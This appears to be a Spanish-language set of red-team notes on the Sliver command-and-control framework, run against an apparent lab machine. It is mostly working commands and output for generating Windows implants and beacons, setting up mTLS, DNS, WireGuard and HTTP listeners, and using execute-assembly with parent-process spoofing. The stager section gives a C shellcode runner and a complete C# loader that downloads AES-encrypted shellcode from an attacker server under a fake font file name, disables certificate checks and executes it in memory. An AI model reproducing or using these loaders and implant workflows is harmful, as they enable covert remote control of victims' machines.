# Sliver C2 \[in progress]

## Instalación

{% embed url="https://dominicbreuker.com/post/learning_sliver_c2_01_installation/" %}

```bash
sudo su
apt-get install build-essential mingw-w64 binutils-mingw-w64 g++-mingw-w64

curl https://sliver.sh/install | sudo bash

# Get latest version url's
curl -s https://api.github.com/repos/BishopFox/sliver/releases/latest \
    | jq -r '.assets | .[] | .browser_download_url' \
    | grep -E '(sliver-server_linux|sliver-client_linux)$'

wget -O /usr/local/bin/sliver-server \                                    
    https://github.com/BishopFox/sliver/releases/download/v1.5.39/sliver-server_linux && \
    chmod 755 /usr/local/bin/sliver-server
wget -O /usr/local/bin/sliver \                                           
    https://github.com/BishopFox/sliver/releases/download/v1.5.39/sliver-client_linux && \
    chmod 755 /usr/local/bin/sliver 

sliver-server unpack --force 
nano /etc/systemd/system/sliver.service
```

{% code title="sliver.service" lineNumbers="true" %}
```apacheconf
[Unit]
Description=Sliver
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=on-failure
RestartSec=3
User=root
ExecStart=/usr/local/bin/sliver-server daemon

[Install]
WantedBy=multi-user.target
```
{% endcode %}

```bash
systemctl daemon-reload
systemctl sliver start
netstat -putona | grep 31337
#==> tcp6  0    0 :::31337      :::*       LISTEN    5362/sliver-server   off (0.00/0/0)
```

<figure><img src="../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>

## Implants y Beacons

### Implant

Vendría a ser el equivalente se tener una shell directa en la máquina víctima, la desventaja es que es muy ruidoso ya que está pendiente al instante de si ejecutamos un comando.

```bash
sliver > generate --mtls 192.168.1.12 --arch amd64 --os windows --format exe --save /var/www/html/

[*] Generating new windows/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 1m30s
[*] Implant saved to /var/www/html/TOUGH_JUMBO.exe

#Flags:
#======
#  -a, --arch               string    cpu architecture (default: amd64)
#  -f, --format             string    Specifies the output formats, valid values are: 'exe', 'shared' (for dynamic libraries), 'service' (see `psexec` for more info) and 'shellcode' (windows only) (default: exe)
#  -m, --mtls               string    mtls connection strings
#  -o, --os                 string    operating system (default: windows)
#  -s, --save               string    directory/file to the binary to

sliver > mtls

[*] Starting mTLS listener ...

[*] Successfully started job #1

sliver > jobs

 ID   Name   Protocol   Port 
==== ====== ========== ======
 1    mtls   tcp        8888 

# Acá la víctima ejecutó el exe que creamos arriba
[*] Session 7467d5c1 TOUGH_JUMBO - 192.168.1.5:49906 (DESKTOP-0AHIE2G) - windows/amd64 - Tue, 06 Jun 2023 18:08:48 EDT

sliver > sessions

 ID         Name          Transport   Remote Address      Hostname          Username   Operating System   Locale   Last Message                               Health  
========== ============= =========== =================== ================= ========== ================== ======== ========================================== =========
 7467d5c1   TOUGH_JUMBO   mtls        192.168.1.5:49906   DESKTOP-0AHIE2G   MalTest    windows/amd64      en-US    Tue Jun  6 18:12:48 EDT 2023 (1m58s ago)   [ALIVE] 

sliver > use
```



### Beacon

Un beacon funciona igual solo que lo que querramos ejecutar se lo planifica como una tarea que se va a ejecutar a intervalos de tiempos que definamos, ya que es cada este tiempo que el beacon va a estar checkeando por si se le mandaron nuevas instrucciones.

```bash
sliver > generate  beacon --mtls 192.168.1.12 --arch amd64 --os windows --format exe --save /var/www/html --seconds 5 --jitter 2

# Flags
# -J, --jitter             int       beacon interval jitter in seconds (default: 30)
# -S, --seconds            int       beacon interval seconds (default: 60)

[*] Generating new windows/amd64 beacon implant binary (5s)
[*] Symbol obfuscation is enabled
[*] Build completed in 42s
[*] Implant saved to /var/www/html/BEWILDERED_BRONCHITIS.exe

sliver > use beacons

? Select a beacon:  [Use arrows to move, type to filter]
> 37a16de8-5756-426d-8814-ba7a14c0ff42  BEWILDERED_BRONCHITIS  192.168.1.5:50271  DESKTOP-0AHIE2G  DESKTOP-0AHIE2G\MalTest  windows/amd64
  68bebc27-19d6-40f5-b9b9-7891726a0ac5  BEWILDERED_BRONCHITIS  192.168.1.5:50256  DESKTOP-0AHIE2G  DESKTOP-0AHIE2G\MalTest  windows/amd64

sliver > (BEWILDERED_BRONCHITIS) > execute notepad

[*] Tasked beacon BEWILDERED_BRONCHITIS (6d591e51)

sliver > (BEWILDERED_BRONCHITIS) > tasks

 ID         State     Message Type   Created                         Sent   Completed 
========== ========= ============== =============================== ====== ===========
 6d591e51   pending   Execute        Tue, 06 Jun 2023 23:37:20 EDT     

# Por si queremos convertir el beacon a un implant y no esperar a los intervalos:
sliver > interactive

# El beacon se convirtió en una sesión
sliver > sessions 
 ID         Name                    Transport   Remote Address      Hostname          Username   Operating System   Locale   Last Message                             Health  
========== ======================= =========== =================== ================= ========== ================== ======== ======================================== =========
 5c977c73   BEWILDERED_BRONCHITIS   mtls        192.168.1.5:50452   DESKTOP-0AHIE2G   MalTest    windows/amd64      en-US    Tue Jun  6 23:38:05 EDT 2023 (30s ago)   [ALIVE] 
```

**System Info**

{% code overflow="wrap" lineNumbers="true" %}
```bash
sliver (goodBoy) > info

         Beacon ID: 8d2e1336-18a9-4eaa-af14-c7199015409f
              Name: goodBoy
          Hostname: DESKTOP-0AHIE2G
              UUID: b58a4d56-453d-1ea9-448c-1fffde95d784
          Username: DESKTOP-0AHIE2G\MalTest
               UID: S-1-5-21-1050558549-14362656-3383254400-1001
               GID: S-1-5-21-1050558549-14362656-3383254400-513
               PID: 2472
                OS: windows
           Version: 10 build 19045 x86_64
            Locale: en-US
              Arch: amd64
         Active C2: https://kali.dnstest.local?driver=wininet
    Remote Address: 192.168.244.131:59001
         Proxy URL: 
          Interval: 5s
            Jitter: 0s
     First Contact: Sat Jul  1 22:03:57 EDT 2023 (7m45s ago)
      Last Checkin: Sat Jul  1 22:11:39 EDT 2023 (3s ago)
      Next Checkin: Sat Jul  1 22:11:44 EDT 2023 (in 2s)

whoami: to get the username
getuid: to get the UID
getgid: to get the GID
getpid: to get the PID


sliver (goodBoy) > help reconfig 

Reconfigure the active beacon/session

Usage:
======
  reconfig [flags]

Flags:
======
  -i, --beacon-interval    string    beacon callback interval
  -j, --beacon-jitter      string    beacon callback jitter (random up to)
  -h, --help                         display help
  -r, --reconnect-interval string    reconnect interval for implant
  -t, --timeout            int       command timeout in seconds (default: 60)
  
```
{% endcode %}

**Process**

* `ps`: Shows a list of processes. Implemented based on the [CreateToolhelp32Snapshot](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot) Windows API ([command handler](https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/handlers/rpc-handlers\_windows.go#L32) and [main implementation](https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/ps/ps\_windows.go#L132)).
* `geteprivs`: Shows the process integrity level of the implant process and the privileges. Implemented based on the [GetTokenInformation](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-gettokeninformation) Windows API ([command handler](https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/handlers/handlers\_windows.go#L577) and [main implementation](https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/priv/priv\_windows.go#L445)).
* `execute` Creates a new process given an executable and optionally some arguments. Implemented based on Golang’s [os/exec package](https://pkg.go.dev/os/exec) ([command handler](https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/handlers/handlers.go#L398) uses the `exec.Command` function, if the `--token` argument is used there is another [command handler](https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/handlers/handlers\_windows.go#L240) also using that function).
* `terminate`: kills as process given a PID. Implemented based on Golangs [os package](https://pkg.go.dev/os) ([command handler](https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/handlers/rpc-handlers.go#L46) and [main implementation](https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/ps/ps.go#L49) which uses `os.FindProcess` to get a process struct `p`, then `p.Kill` to kill it).
* `kill`: kills the current beacon or session. Implemented as a special handler on Windows. For DLL or shellcode implants, it does the following: If the `--force` flag is set, it calls [ExitProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-exitprocess) from `kernel32.dll`, else it called [ExitThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-exitthread) ([command handler](https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/handlers/special-handlers\_windows.go#L50)). For other implants, it just uses Golangs [os package](https://pkg.go.dev/os) to `Exit`, i.e., kill the current process.

**Registers**

* `registry read`: Read a value ([command handler](https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/handlers/handlers\_windows.go#L487)).
* `registry write`: Write a value ([command handler](https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/handlers/handlers\_windows.go#L457)).
* `registry create`: Create a new subkey ([command handler](https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/handlers/handlers\_windows.go#L505)).
* `registry delete`: Delete a key ([command handler](https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/handlers/handlers\_windows.go#L522)).
* `registry list-subkeys`: List all subkeys of a given key ([command handler](https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/handlers/handlers\_windows.go#L539)).
* `registry list-values`: List all values of a given key ([command handler](https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/handlers/handlers\_windows.go#L558)).

#### DNS  address in Beacon

#### DNS Beacons

```bash
sliver > dns -d dnsc2.labnet.local.

[*] Starting DNS listener with parent domain(s) [dnsc2.labnet.local.] ...

[*] Successfully started job #2

sliver > generate beacon --dns dnsc2.labnet.local --seconds 10 --jitter 0 --save /home/kali/Desktop/Sliver/dns-beacon.exe

[*] Generating new windows/amd64 beacon implant binary (10s)
[*] Symbol obfuscation is enabled
[*] Build completed in 2m6s
? Overwrite existing file? Yes
[*] Implant saved to /home/kali/Desktop/Sliver/dns-beacon.exe

[*] Beacon d04b048f WONDERFUL_SUNBONNET - n/a (DESKTOP-0AHIE2G) - windows/amd64 - Sat, 10 Jun 2023 19:07:20 EDT
```

Se puede pasar también una dirección con nuestro server DNS, y por si llega a fallar la conexión o el servidor dns está caído podemos pasarle la dirección ip aparte.

```bash
sliver > mtls

[*] Starting mTLS listener ...

[*] Successfully started job #1

sliver > jobs

 ID   Name   Protocol   Port 
==== ====== ========== ======
 1    mtls   tcp        8888 

sliver >  generate beacon --os windows --arch amd64 --format exe --save /home/kali/Desktop/dns-beacon.exe --seconds 5 --mtls kali.dnstest.local,192.168.1.12

[*] Generating new windows/amd64 beacon implant binary (5s)
[*] Symbol obfuscation is enabled
[*] Build completed in 25s
? Overwrite existing file? Yes
[*] Implant saved to /home/kali/Desktop/dns-beacon.exe

[*] Beacon f40b0b34 FRIENDLY_CATTLE - 192.168.1.11:54656 (DESKTOP-0AHIE2G) - windows/amd64 - Fri, 09 Jun 2023 22:25:53 EDT
```



#### Wireguard

Aparte de **mtls** podemos usar el protocolo wireguard.

```bash
sliver > wg

[*] Starting Wireguard listener ...
[*] Successfully started job #2

sliver > jobs

 ID   Name   Protocol   Port 
==== ====== ========== ======
 1    mtls   tcp        8888 
 2    wg     udp        53   

sliver > generate beacon --wg kali.dnstest.local --arch amd64 --os windows --format exe --save /home/kali/Desktop/wg-dns-beacon.exe --seconds 5

[*] Generated unique ip for wg peer tun interface: 100.64.0.7
[*] Generating new windows/amd64 beacon implant binary (5s)
[*] Symbol obfuscation is enabled
[*] Build completed in 32s
[*] Implant saved to /home/kali/Desktop/wg-dns-beacon.exe

```



#### Bypassing HTTP/S Proxys

Se puede dar el caso de un entorno restrictivo en el que no podamos usar mtls, por lo que podemos setear un listener http y otro https, sobre el que podemos intentar que la víctima se conecte. HTTP es igual de seguro que HTTP/S debido a que el contenido de los implantes ya van cifrados, pero se debe tratar igualmente de usar https en primera instancia. Tambien podemos usar el driver **wininet**, que si bien es más propenso a ser analizado nos permite más funcionalidades.

<pre><code>sliver > jobs

[*] No active jobs

sliver > http

[*] Starting HTTP :80 listener ...
[*] Successfully started job #3

sliver > https

[*] Starting HTTPS :443 listener ...

[*] Successfully started job #4

sliver > jobs

 ID   Name    Protocol   Port 
==== ======= ========== ======
 3    http    tcp        80   
 4    https   tcp        443  

<strong>sliver > generate beacon --http kali.dnstest.local,kali.dnstest.local?driver=wininet --seconds 5 --jitter 0 --save /tmp/beacon_http.exe
</strong>
[*] Generating new windows/amd64 beacon implant binary (5s)
[*] Symbol obfuscation is enabled
[*] Build completed in 00:00:23
[*] Implant saved to /tmp/beacon_http.exe
</code></pre>

Opciones para customizar wininet:

{% embed url="https://github.com/BishopFox/sliver/wiki/C2-Advanced-Options" %}

### Profiles

Los perfiles nos permiten el no tener que escribir todas las flags al generar un implante o beacon.

```bash
sliver > profiles new --mtls 192.168.1.12 --arch amd64 --os windows --format exe test_profile

[*] Saved new implant profile test_profile

sliver > profiles new beacon  --mtls 192.168.1.12 --arch amd64 --os windows --format exe --seconds 5 --jitter 3 test_beacon

[*] Saved new implant profile (beacon) test_beacon

sliver > profiles generate --save /var/www/html test_profile

[*] Generating new windows/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 29s
[*] Implant saved to /var/www/html/IMPORTANT_NAPKIN.exe

sliver > profiles generate --save /var/www/html test_beacon

[*] Generating new windows/amd64 beacon implant binary (5s)
[*] Symbol obfuscation is enabled
[*] Build completed in 27s
[*] Implant saved to /var/www/html/SAD_DEPRESSIVE.exe
```



## Stagers

Como los payloads generados por Sliver pesan mucho (al menos 10mb al estar compilados en GO), podemos generar nuestro propio shellcode en Sliver (a partir de MSFVenom) y creando programa que ejecute esta shellcode.

### Basic Stager

Para generar el shellcode es necesario crear un perfil con el cual vamos a generar los listener

<pre class="language-bash"><code class="lang-bash">sliver > profiles new  --mtls kali.dnstest.local --skip-symbols --format shellcode --arch amd64 win64shell

[*] Saved new implant profile win64shell

sliver > mtls

[*] Starting mTLS listener ...

[*] Successfully started job #1

sliver > stage-listener --url tcp://kali.dnstest.local:8443 --profile win64shell

[*] No builds found for profile win64shell, generating a new one
[*] Job 2 (tcp) started

sliver > jobs

 ID   Name   Protocol   Port 
==== ====== ========== ======
 1    mtls   tcp        8888 
 2    TCP    tcp        8443 

sliver > generate stager --lhost kali.dnstest.local --lport 8443 --arch amd64 --format c --save /tmp

[*] Sliver implant stager saved to: /tmp/WIDE-EYED_PLANET


#--------------------------------#

cat /tmp/WIDE-EYED_PLANET                
unsigned char buf[] = 
"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
<strong>                        . . .
</strong>"\x52\x51\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18"
                        . . .
</code></pre>

Como vamos a usar C para nuestro programa nos debería quedar algo así:

{% code lineNumbers="true" %}
```c
#include "windows.h"

int main()
        {
        unsigned char buf[] = 
                "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
                "\x52\x51\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18"
                "\x48\x8b\x52\x20\x56\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48"
                                      . . .
                "\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49"
                "\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48"
                "\x2a\x0a\x41\x89\xda\xff\xd5";
                
    void *exec = VirtualAlloc(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, buf, sizeof buf);
    ((void(*)())exec)();

    return 0;
}
```
{% endcode %}

Para posteriormente compilarlo para que funcione en windows con MinGW:

&#x20;`x86_64-w64-mingw32-gcc -o shellexec shellexec.c`



Y al ejecutar el programa compilado obtenemos una conexión (no encriptada) con el host víctima:&#x20;

<figure><img src="../.gitbook/assets/image (110).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>



### Encripted Stager

```bash
## Generate key and IV ##
head -c 8 /dev/urandom | xxd -p
################################

# Create a profile
profiles new --mtls 192.168.244.129 --format shellcode --skip-symbols --arch amd64 <profile-name>

# Start the listener for the shellcode
stage-listener --url http://192.168.244.129:80 --profile win641 --aes-encrypt-key <aes-key> --aes-encrypt-iv <aes-iv>

# And for the session
mtls

##
sliver > jobs

 ID   Name   Protocol   Port 
==== ====== ========== ======
 3    http   tcp        80   
 4    mtls   tcp        8888 
 
```



#### C# Code

/platform:x64

```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Net;
using System.Security.Cryptography;
using System.IO;

namespace stagerHttp
{
    class Program
    {
        private static string AESKey = "ec1238205e0e65ce";
        private static string AESIV = "786b6eb024458604";
        private static string url = "http://192.168.244.129/fontawesome.woff";
        public static void Main(String[] args)
        {
            byte[] shellcode = Download(url);
            Execute(shellcode);

            return;
        }

        private static byte[] Download(string url)
        {
            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;

            System.Net.WebClient client = new System.Net.WebClient();
            byte[] shellcode = client.DownloadData(url);
            List<byte> l = new List<byte> { };

            for (int i = 16; i <= shellcode.Length - 1; i++)
            {
                l.Add(shellcode[i]);
            }

            byte[] actual = l.ToArray();

            byte[] decrypted;

            decrypted = Decrypt(actual, AESKey, AESIV);

            return decrypted;
        }

        private static byte[] Decrypt(byte[] ciphertext, string AESKey, string AESIV)
        {
            byte[] key = Encoding.UTF8.GetBytes(AESKey);
            byte[] IV = Encoding.UTF8.GetBytes(AESIV);

            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = IV;
                aesAlg.Padding = PaddingMode.None;

                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

                using (MemoryStream memoryStream = new MemoryStream(ciphertext))
                {
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(ciphertext, 0, ciphertext.Length);
                        return memoryStream.ToArray();
                    }
                }
            }
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        private static void Execute(byte[] shellcode)
        {
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (UInt32)shellcode.Length, 0x1000, 0x40);
            Marshal.Copy(shellcode, 0, (IntPtr)(addr), shellcode.Length);


            IntPtr hThread = IntPtr.Zero;
            IntPtr threadId = IntPtr.Zero;
            hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, threadId);

            WaitForSingleObject(hThread, 0xFFFFFFFF);

            return;
        }
    }
}

```

## Execute Assembly

{% embed url="https://github.com/BishopFox/sliver/wiki/Using-3rd-party-tools" %}

Esta función nos permite ejecutar tanto DLL's como ejecutables en memoria, por lo que si queremos utilizar herramientas de terceros que no estén incluidas en Sliver lo podremos hacer a través de esta funcionalidad.  Lo primero es tener compilado el ejecutable o la DLL y después especificar si queremos ejecutarlo sobre el proceso en el que tengamos el implante o crear otro proceso para hacerlo más sigiloso. La desventaja es que solo corre únicamente aplicaciones escritas en **.NET**.

```bash
# Mismo proceso
execute-assembly --in-process  --loot --name seatbelt /home/kali/Desktop/Sliver/Seatbelt.exe -group=User
 
# Spoofear otro proceso especificando el process parent id (donde está nuestro implante)
execute-assembly --ppid 5152 --process svchost.exe --loot --name seatbelt /home/kali/Desktop/Sliver/Seatbelt.exe -group=User
```

{% embed url="https://thewover.github.io/Introducing-Donut/" %}

